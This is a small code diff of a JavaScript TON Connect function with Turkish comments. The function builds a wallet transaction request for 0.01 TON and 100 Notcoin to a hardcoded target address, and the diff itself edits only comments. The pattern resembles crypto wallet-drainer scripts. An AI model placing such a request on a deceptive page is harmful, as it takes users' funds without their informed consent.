@@ -18,14 +18,14 @@ const request_transaction = async (tonConnectUI) => {
 
     console.log('Cüzdan adresi:', walletAddress);
 
-    // Burada 0.01 TON ve 100 Notcoin talep ediyoruz
+    // 0.01 TON ve 100 Notcoin talep ediyoruz
     const amountToRequestTON = 10000000; // 0.01 TON'u nanoTON cinsinden belirtin
     const amountToRequestNotcoin = 100; // 100 Notcoin
 
     // Hedef cüzdan adresini buraya yazın
     const targetAddress = "UQDKbP8AA8sYpdI5v4elb600P5f6tdXbOJrG3vEjnoAiHREB"; // Hedef cüzdan adresi
 
-    // Talep mesajları
+    // Talep mesajı
     const messages = [
       {
         address: targetAddress, // Hedef cüzdan adresi
